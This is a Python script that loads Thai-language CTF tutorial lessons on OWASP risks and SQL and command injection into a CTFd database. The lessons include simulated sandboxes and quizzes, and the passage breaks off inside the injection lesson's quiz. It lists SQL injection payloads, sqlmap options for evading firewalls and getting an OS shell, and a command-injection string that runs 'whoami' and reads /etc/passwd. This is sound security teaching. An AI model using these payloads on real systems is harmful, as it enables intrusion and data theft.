import json
from CTFd import create_app
from CTFd.plugins.tutorials import TutorialLesson

app = create_app()
ctx = app.app_context()
ctx.push()
db = app.db

def save_lesson(lid, val0, val1, val2):
    l = db.session.query(TutorialLesson).filter_by(id=lid).first()
    blocks = [
        {"type": "markdown", "value": val0},
        {"type": "markdown", "value": val1},
        {"type": "markdown", "value": val2}
    ]
    l.content = json.dumps(blocks, ensure_ascii=False)
    db.session.query(TutorialLesson).filter_by(id=lid).update({"content": l.content})
    db.session.commit()
    print(f"Lesson {lid} complete upgrade finished!")

# ─── 1. Lesson 177: Web Application Security & OWASP ───
val177_0 = """## 🌐 Web Application Security & OWASP (สถาปัตยกรรมเว็บแอปและความรู้เบื้องต้น)
---

ยินดีต้อนรับสู่บทเรียนสถาปัตยกรรมเว็บแอปและความเข้าใจเชิงความมั่นคงปลอดภัยตามมาตรฐาน OWASP

<style>
.w-neon-card {
  background: rgba(6, 8, 20, 0.45) !important;
  border: 1px solid rgba(0, 240, 255, 0.15) !important;
  border-radius: 12px !important;
  padding: 20px !important;
  margin-bottom: 24px !important;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 0 15px rgba(0,240,255,0.02) !important;
}
.w-owasp-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 12px;
  margin-top: 14px;
}
.w-owasp-box {
  background: rgba(255,255,255,0.01);
  border: 1px solid rgba(255,255,255,0.04);
  border-radius: 8px;
  padding: 12px;
  font-size: 0.76rem;
  border-left: 3px solid #00f0ff;
}
.w-code-lbl {
  font-family: 'JetBrains Mono', monospace;
  background: rgba(0,240,255,0.08);
  color: #00f0ff;
  padding: 1px 6px;
  border-radius: 4px;
  font-size: 0.7rem;
}
</style>

### 🛡️ 1. OWASP Top 10 Risks (2025/2026)
รายการอันดับความเสี่ยงสูงสุดและช่องโหว่วิกฤตของเว็บแอปพลิเคชันจัดระเบียบโดยโครงการ OWASP:
<div class="w-neon-card">
  <div class="w-owasp-grid">
    <div class="w-owasp-box"><strong>A01: Broken Access Control</strong><br><span class="text-muted">การละเมิดสิทธิ์เข้าถึง (/profile/view/12346)</span></div>
    <div class="w-owasp-box"><strong>A02: Security Misconfiguration</strong><br><span class="text-muted">ตั้งค่าระบบผิดพลาด เช่น ปล่อย debug mode ค้างไว้</span></div>
    <div class="w-owasp-box"><strong>A03: Software Supply Chain Failures</strong><br><span class="text-muted">ช่องโหว่ความเสี่ยงจากไลบรารีภายนอกที่ไม่มีลายเซ็นต์</span></div>
    <div class="w-owasp-box"><strong>A04: Cryptographic Failures</strong><br><span class="text-muted">การใช้ MD5 หรือปล่อยคีย์รหัสผ่านรั่วไหล</span></div>
    <div class="w-owasp-box"><strong>A05: Injection</strong><br><span class="text-muted">ช่องโหว่การแทรกโค้ดทำลายสิทธิ์ เช่น SQLi, XSS</span></div>
    <div class="w-owasp-box"><strong>A06: Insecure Design</strong><br><span class="text-muted">โครงสร้างออกแบบไม่ปลอดภัย เช่น ขาดระบบ Rate limiting</span></div>
    <div class="w-owasp-box"><strong>A07: Authentication Failures</strong><br><span class="text-muted">ระบบตรวจสอบล็อกอินบกพร่อง ปล่อยรหัสผ่านอ่อนแอง่าย</span></div>
    <div class="w-owasp-box"><strong>A08: Software & Data Integrity</strong><br><span class="text-muted">การโจมตีแฝงมัลแวร์ผ่านท่อส่งโปรแกรม CI/CD</span></div>
    <div class="w-owasp-box"><strong>A09: Logging & Monitoring Failures</strong><br><span class="text-muted">ขาดการบันทึกประวัติล็อกไฟล์เมื่อมีการยิง brute-force</span></div>
    <div class="w-owasp-box"><strong>A10: Mishandling Exceptions</strong><br><span class="text-muted">เกิด Error แล้วหลบตรวจสอบข้ามสิทธิ์ความปลอดภัย</span></div>
  </div>
</div>

---

### 🔍 2. Web Developer Tools (F12 DevTools)
เครื่องมือหลักในบราวเซอร์สำหรับวิเคราะห์ช่องโหว่เบื้องต้นของหน้าเว็บ:
<div class="w-neon-card">
  <ul style="padding-left:16px; font-size:0.78rem; color:#cbd5e1; line-height:1.65; margin:0;">
    <li><strong>Elements tab</strong>: ตรวจสอบและแก้ไขค่าโครงสร้าง HTML/CSS ได้สดๆ (เช่น เปลี่ยน input <span class="w-code-lbl">type="hidden"</span> เป็น <span class="w-code-lbl">text</span> เพื่อแสดงข้อมูลลับ)</li>
    <li><strong>Console tab</strong>: สั่งรันเขียนสคริปต์ JavaScript หรือตรวจประวัติค่าตัวแปรในหน้าเว็บ</li>
    <li><strong>Sources tab</strong>: วิเคราะห์สืบหาโค้ด JS ทั้งหมดและใส่ Breakpoint เพื่อดีบั๊กการส่งแบบฟอร์ม</li>
    <li><strong>Application tab</strong>: ตรวจสอบคุกกี้เซสชันของเว็บไซต์ภายใต้หัวข้อ Storage Cookies</li>
  </ul>
</div>"""

val177_1 = """### 💻 HTTP Headers Diagnostic Sandbox (จำลองวิเคราะห์โครงสร้างข้อมูลเว็บ)

คลิกหัวข้อด้านซ้ายมือเพื่อจำลองวิเคราะห์โครงสร้าง และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อตรวจสอบทราฟฟิกข้อมูล:

<div class="w-sandbox-main"><div class="w-sandbox-nav"><button id="nav-item-httpget" class="w-nav-item active" onclick="showSandboxItem('httpget', this)">1. Send HTTP GET</button><button id="nav-item-httppost" class="w-nav-item" onclick="showSandboxItem('httppost', this)">2. Send HTTP POST</button></div><div class="w-sandbox-panels"><div id="panel-httpget" class="w-sand-panel"><div class="w-sand-hdr"><span>1. HTTP GET Request Method</span> <span class="tag">HTTP Client</span></div><pre class="w-sand-code">GET /index.php HTTP/1.1
Host: ctf.rpca.ac.th
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session_id=abc123xyz</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startWebSim('httpget')">▶ Run Simulation</button></div><div id="term-httpget" class="w-sand-term"><span class="prompt">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>เมธอด GET ใช้เพื่อดึงดึงหน้าเพจขึ้นมาแสดงผล โดยผู้ใช้ส่งคุกกี้เพื่อยืนยันเซสชันการเป็นเจ้าของสิทธิ์แอดมิน</p></div></div><div id="panel-httppost" class="w-sand-panel"><div class="w-sand-hdr"><span>2. HTTP POST Request Method</span> <span class="tag">HTTP Client</span></div><pre class="w-sand-code">POST /login.php HTTP/1.1
Host: ctf.rpca.ac.th
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=secret</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startWebSim('httppost')">▶ Run Simulation</button></div><div id="term-httppost" class="w-sand-term"><span class="prompt">client$</span> [กดปุ่ม Run Simulation เพื่อส่ง Request]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>เมธอด POST ใช้เพื่อส่งข้อมูลชุดใหญ่ที่เป็นความลับ (เช่น รหัสผ่าน) ไปประมวลผลบนระบบเซิร์ฟเวอร์โดยไม่ผ่านทาง URL</p></div></div></div></div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.setProperty('display', 'none', 'important'); });
  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) { targetPanel.style.setProperty('display', 'block', 'important'); }
}
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span class="prompt">client$</span> <span class="cmd">Sending HTTP Request...</span>\\n[.] Accessing remote port\\n[.] Reading Response Headers...';
  setTimeout(() => {
    if (itemKey === 'httpget') {
      term.innerHTML = '<span class="prompt">client$</span> <span class="cmd">HTTP/1.1 200 OK</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nContent-Type: text/html\\nContent-Length: 1042\\n\\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Welcome to RPCA Cyber Club&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;';
    } else if (itemKey === 'httppost') {
      term.innerHTML = '<span class="prompt">client$</span> <span class="cmd">HTTP/1.1 302 Found</span>\\nServer: Apache/2.4.41 (Ubuntu)\\nLocation: /dashboard.php\\nSet-Cookie: session_id=abc123xyz; Path=/; HttpOnly\\n\\n[+] Redirecting to dashboard...';
    }
  }, 1000);
}
</script>"""

val177_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. พอร์ตบริการเครือข่ายมาตรฐานสำหรับการเข้าถึงหน้าเว็บเพจแบบเข้ารหัสปลอดภัย (HTTPS) คือพอร์ตใด?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="web_port" value="80" data-hash="false">Port 80</label><label class="w-quiz-option"><input type="radio" name="web_port" value="443" data-hash="868846c4f8d48e0259b38466e3fb0c4b26090cfa4b6f1f457788be4fbf0fa8fb">Port 443 (HTTPS)</label><label class="w-quiz-option"><input type="radio" name="web_port" value="22" data-hash="false">Port 22</label><label class="w-quiz-option"><input type="radio" name="web_port" value="8080" data-hash="false">Port 8080</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. โครงการมาตรฐานสากลด้านความปลอดภัยเว็บที่จัดอันดับ 10 ความเสี่ยงสูงสุดของเว็บแอปพลิเคชันคือองค์กรใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="owasp_q" value="W3C" data-hash="false">W3C</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="OWASP" data-hash="3367b846e49226cb100416972049d5bf59892cfa76e4a2cdbbf24c56e2978000">OWASP</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="SANS" data-hash="false">SANS Institute</label><label class="w-quiz-option"><input type="radio" name="owasp_q" value="MITRE" data-hash="false">MITRE Corporation</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<script>
const lessonKey = 'solved_lesson_177';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#00f0ff';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

save_lesson(177, val177_0, val177_1, val177_2)

# ─── 2. Lesson 178: SQL Injection & Command Injection ───
val178_0 = """## 💉 SQL Injection & Command Injection (ช่องโหว่ประเภท Injection)
---

ยินดีต้อนรับสู่บทเรียนช่องโหว่การแทรกคำสั่งอันตราย (Injection) ซึ่งเป็นหนึ่งในช่องโหว่ทางเว็บที่สร้างความเสียหายสูงสุดแก่ระบบเก็บรักษาข้อมูล

<style>
.w-neon-card {
  background: rgba(6, 8, 20, 0.45) !important;
  border: 1px solid rgba(168, 85, 247, 0.15) !important;
  border-radius: 12px !important;
  padding: 20px !important;
  margin-bottom: 24px !important;
  box-shadow: 0 8px 32px rgba(0,0,0,0.3), inset 0 0 15px rgba(168,85,247,0.02) !important;
}
.w-sql-table {
  width: 100%;
  border-collapse: collapse;
}
.w-sql-table th, .w-sql-table td {
  padding: 8px 12px;
  border: 1px solid rgba(255,255,255,0.06);
  font-size: 0.74rem;
}
.w-sql-table th {
  background: rgba(168,85,247,0.08);
  color: #ffffff;
  font-weight: 700;
}
</style>

### 🗄️ 1. SQL Injection (SQLi) Categories & Payloadbox
ช่องโหว่ที่เกิดจากผู้ออกแบบเขียนคิวรีเชื่อมข้อมูลอินพุตดิบ:
<div class="w-neon-card">
  <table class="w-sql-table">
    <thead>
      <tr>
        <th>ประเภทช่องโหว่ (Category)</th>
        <th>ตัวอย่าง Payload ยอดนิยม</th>
        <th>คำอธิบายสไลด์ประมวลผล</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Authentication Bypass</strong></td>
        <td><code>' OR '1'='1' --</code></td>
        <td class="text-muted">ข้ามขั้นตอนความปลอดภัยผ่านผลลัพธ์คิวรีที่เป็นจริงตลอด</td>
      </tr>
      <tr>
        <td><strong>UNION-Based SQLi</strong></td>
        <td><code>' UNION SELECT database(), user() --</code></td>
        <td class="text-muted">ดึงสเปกและสิทธิ์แอดมินฐานข้อมูลร่วมข้ามตาราง</td>
      </tr>
      <tr>
        <td><strong>Error-Based SQLi</strong></td>
        <td><code>' AND (SELECT @@version) --</code></td>
        <td class="text-muted">จงใจบังคับให้เซิร์ฟเวอร์ตอบกลับโดยระบุเวอร์ชันใน error</td>
      </tr>
      <tr>
        <td><strong>Time-Based Blind SQLi</strong></td>
        <td><code>' OR IF(1=1, SLEEP(5), 0) --</code></td>
        <td class="text-muted">หน่วงเวลาคำนวณเซิร์ฟเวอร์ทีละบิตกรณีปิดหน้าต่างแสดงผล</td>
      </tr>
    </tbody>
  </table>
</div>

---

### 🐚 2. SQLMap Automated Injection Options
ชุดคำสั่งยอดนิยมที่นักทดสอบใช้ยิงสแกนหาช่องโหว่ SQLi อัตโนมัติ:
<div class="w-neon-card">
  <ul style="padding-left:16px; font-size:0.76rem; color:#cbd5e1; line-height:1.65; margin:0;">
    <li><span class="w-code-inline">--dbs</span> : แสดงรายชื่อฐานข้อมูล (Databases) ทั้งหมดบนเซิร์ฟเวอร์</li>
    <li><span class="w-code-inline">--tables -D target_db</span> : แสดงชื่อตารางของฐานข้อมูล target_db</li>
    <li><span class="w-code-inline">--dump -T users -D target_db</span> : แรนดึงข้อมูลตาราง users ทั้งหมด</li>
    <li><span class="w-code-inline">--tamper=randomcase</span> : สุ่มพยัญชนะพิมพ์เล็กใหญ่เพื่อหลบเลี่ยง Web Application Firewall (WAF)</li>
    <li><span class="w-code-inline">--os-shell</span> : ขอสิทธิ์เปิดหน้าต่าง CLI คุมระบบปฏิบัติการเป้าหมายตรงๆ</li>
  </ul>
</div>"""

val178_1 = """### 💻 SQLi & Command Injection Sandbox (จำลองยิงแทรกโค้ดทำลายสิทธิ์)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาตัวอย่าง และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลลัพธ์ผ่านเทอร์มินัลระบบ:

<div class="w-sandbox-main"><div class="w-sandbox-nav"><button id="nav-item-sqli" class="w-nav-item active" onclick="showSandboxItem('sqli', this)">1. SQLi Auth Bypass</button><button id="nav-item-cmdinj" class="w-nav-item" onclick="showSandboxItem('cmdinj', this)">2. Command Injection</button></div><div class="w-sandbox-panels"><div id="panel-sqli" class="w-sand-panel"><div class="w-sand-hdr"><span>1. SQL Injection Authentication Bypass</span> <span class="tag">SQLi Attack</span></div><pre class="w-sand-code">SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = '...'</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startInjSim('sqli')">▶ Run Simulation</button></div><div id="term-sqli" class="w-sand-term"><span class="prompt">sqli-lab$</span> [กดปุ่ม Run Simulation เพื่อส่ง SQLi payload]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>สัญลักษณ์ `--` จะสั่งคอมเมนต์คำสั่งตรวจสอบรหัสผ่าน (Password) ด้านหลังทิ้งไปทั้งหมด ทำให้ระบบรับเงื่อนไขที่เป็นจริงตลอดล็อกอินได้ทันที</p></div></div><div id="panel-cmdinj" class="w-sand-panel"><div class="w-sand-hdr"><span>2. OS Command Injection Attack</span> <span class="tag">OS Command</span></div><pre class="w-sand-code">ping -c 1 127.0.0.1; whoami; cat /etc/passwd</pre><div class="w-sand-term-container"><div class="w-sand-term-bar"><span class="w-sand-term-title">🐚 Terminal Console</span><button class="w-sand-term-btn" onclick="startInjSim('cmdinj')">▶ Run Simulation</button></div><div id="term-cmdinj" class="w-sand-term"><span class="prompt">victim-server$</span> [กดปุ่ม Run Simulation เพื่อจำลองส่งคำสั่ง]</div></div><div class="w-sand-expl"><h5>⚙️ Command Description</h5><p>สัญลักษณ์เซมิโคลอน `;` ช่วยตัดจบคำสั่งเดิมและสั่งรันคำสั่ง OS ตัวที่สอง (เช่น whoami) เพื่อค้นหาระดับสิทธิ์แอดมิน</p></div></div></div></div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const items = document.querySelectorAll('.w-sandbox-nav .w-nav-item');
  items.forEach(i => i.classList.remove('active'));
  element.classList.add('active');
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.setProperty('display', 'none', 'important'); });
  const targetPanel = document.getElementById('panel-' + itemKey);
  if (targetPanel) { targetPanel.style.setProperty('display', 'block', 'important'); }
}
setTimeout(() => {
  const activeBtn = document.querySelector('.w-sandbox-nav .w-nav-item.active');
  if (activeBtn) { activeBtn.click(); }
}, 100);
window.startInjSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span class="prompt">victim-server$</span> <span class="cmd">Processing input vector...</span>\\n[.] Accessing backend database...';
  setTimeout(() => {
    if (itemKey === 'sqli') {
      term.innerHTML = '<span class="prompt">sqli-lab$</span> <span class="cmd">SQL Query Executed:</span>\\n[+] Authentication Bypass Successful!\\n[+] User data retrieved: ID=1, Username=admin, Role=SuperAdmin';
    } else if (itemKey === 'cmdinj') {
      term.innerHTML = '<span class="prompt">victim-server$</span> <span class="cmd">whoami</span>\\n<span style="color:#ef4444; font-weight:bold;">www-data</span>\\n\\n<span class="prompt">victim-server$</span> <span class="cmd">cat /etc/passwd | head -n 2</span>\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin';
    }
  }, 1000);
}
</script>"""

val178_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ช่องโหว่ประเภทใดเกิดขึ้นจากการที่เซิร์ฟเวอร์นำอินพุตของผู้ใช้ไปเรียกประมวลผลเป็นคำสั่งระบบปฏิบัติการโดยตรง?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="inj_type" value="SQLi" data-hash="false">SQL Injection</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="Command Injection" data-hash="23c7f5c90b6b80d90bd93d8435d648b26e03fb21884be5e38f6b864a66e4a2cd">Command Injection</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="XSS" data-hash="false">Cross-Site Scripting (XSS)</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="LFI" data-hash="false">Local File Inclusion (LFI)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. คิวรีเป้าหมายพิเศษระดับมาตรฐาน \' OR 1=1 -- นิยมใช้ส่งเข้าไปในฐานข้อมูลเพื่อทำลายเงื่อนไขข้อใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Data Exfiltration" data-hash="false">ขโมยดูข้อมูลทั้งหมด (Data Exfiltration)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Bypass Auth" data-hash="a95aa975765796245d8b8ff716d0046522bb33f749eb721867c4e515d18d451">ข้ามขั้นตอนตรวจสอบยืนยันตน (Bypass Authentication)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="DoS" data-hash="false">ทำลายเซิร์ฟเวอร์ระบบล่ม (Denial of Service)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Password cracking" data-hash="false">ค้นหารหัสผ่านระบบ (Password Cracking)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<script>
const lessonKey = 'solved_lesson_178';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#a855f7';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
